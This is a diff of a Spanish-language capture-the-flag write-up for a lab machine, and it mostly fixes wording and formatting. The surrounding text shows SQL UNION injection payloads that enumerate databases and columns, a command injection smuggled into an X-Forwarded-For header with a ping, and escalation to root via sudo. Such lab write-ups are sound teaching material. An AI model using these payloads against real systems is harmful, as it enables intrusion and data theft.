@@ -186,7 +186,7 @@
     <span class="sr-only">Link to heading</span>
   </a>
 </h1>
-<p>Viendo la página en el puerto 80, tenemos que podemos verificar <code>players</code> para si son elegibles para participar en algún torneo</p>
+<p>Viendo la página en el puerto 80, tenemos que podemos verificar <code>players</code> para ver si son elegibles para participar en algún torneo</p>
 <img src="/images/Pasted image 20251226152243.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Si ponemos algún valor, aparece un mensaje, y un apartado para ir a <code>http:10.10.11.128/challenge.php</code></p>
 <img src="/images/Pasted image 20251226152400.png" style="width:100%; height:auto; display:block; margin:auto;">
@@ -199,7 +199,7 @@
     <span class="sr-only">Link to heading</span>
   </a>
 </h1>
-<p>Interceptando la petición de la página principal en <code>burpsuite</code>, probamos inyecciones sql básicas, teniendo éxito en la <code>Union injection</code> Con el siguiente payload</p>
+<p>Interceptando la petición de la página principal en <code>burpsuite</code>, probamos inyecciones sql básicas, teniendo éxito en la <code>Union injection</code> con el siguiente payload</p>
 <div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>celero0<span style="color:#f85149">&#39;</span> UNION SELECT 1;--+-
 </span></span></code></pre></div><img src="/images/Pasted image 20251226153043.png" style="width:100%; height:auto; display:block; margin:auto;">
 <h2 id="viendo-las-bases-de-datos">
@@ -210,8 +210,8 @@
   </a>
 </h2>
 <p>Podemos ver que solo tiene una columna la consulta, por lo tanto procederemos a investigar por las bases de datos</p>
-<pre tabindex="0"><code>celero0&#39; UNION SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata;-- -
-</code></pre><p>Teniendo como resultado las siguientes bases de datos <code>mysql,information_schema,performance_schema,sys,november</code>, la que parece más interesante es la última, <code>november</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>celero0<span style="color:#f85149">&#39;</span> UNION SELECT GROUP_CONCAT<span style="color:#ff7b72;font-weight:bold">(</span>schema_name<span style="color:#ff7b72;font-weight:bold">)</span> FROM information_schema.schemata;-- -
+</span></span></code></pre></div><p>Teniendo como resultado las siguientes bases de datos <code>mysql,information_schema,performance_schema,sys,november</code>, la que parece más interesante es la última, <code>november</code>.</p>
 <h2 id="viendo-las-tablas">
   Viendo las tablas
   <a class="heading-link" href="#viendo-las-tablas">
@@ -232,7 +232,7 @@
 </h2>
 <p>Para ver el nombre de la columna de la tabla <code>flag</code> tenemos el siguiente payload</p>
 <div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>celero0<span style="color:#a5d6ff">&#39; UNION SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name=&#39;</span>flag<span style="color:#f85149">&#39;</span>;-- -
-</span></span></code></pre></div><p>Mostrando que existe sólo una columna llamada <code>one</code></p>
+</span></span></code></pre></div><p>Mostrando que existe solo una columna llamada <code>one</code></p>
 <img src="/images/Pasted image 20251226155306.png" style="width:100%; height:auto; display:block; margin:auto;">
 <h2 id="viendo-los-valores-de-la-columna">
   Viendo los valores de la columna
@@ -306,7 +306,7 @@ tomando como valor la <code>IP</code> que aparece en <code>HTTP_X_FORWARDED_FOR<
 <p>Por lo tanto nos podemos aprovechar de la mala configuración para ejecutar un comando arbitrario, para probar si es vulnerable haremos lo siguiente</p>
 <div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>X-FORWARDED-FOR: 10.10.10.10;ping 10.10.14.20;
 </span></span></code></pre></div><img src="/images/Pasted image 20251226175349.png" style="width:100%; height:auto; display:block; margin:auto;">
-<p>y verificamos las trazas <code>ICMP</code> con <code>TCPDUMP</code> de la siguiente forma</p>
+<p>y verificamos las trazas <code>ICMP</code> con <code>tcpdump</code> de la siguiente forma</p>
 <div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>tcpdump -i tun0 icmp
 </span></span></code></pre></div><p>y tenemos respuestas, por lo tanto se ejecuta el RCE</p>
 <img src="/images/Pasted image 20251226175317.png" style="width:100%; height:auto; display:block; margin:auto;">
@@ -321,6 +321,7 @@ tomando como valor la <code>IP</code> que aparece en <code>HTTP_X_FORWARDED_FOR<
 <img src="/images/Pasted image 20251226175653.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Por tanto nos convertiremos en el usuario <code>root</code> con el comando <code>sudo su</code> y procederemos a leer la flag de <code>/root/root.txt</code></p>
 <img src="/images/Pasted image 20251226175751.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Comprometiendo totalmente el sistema.</p>
 
       </div>
 
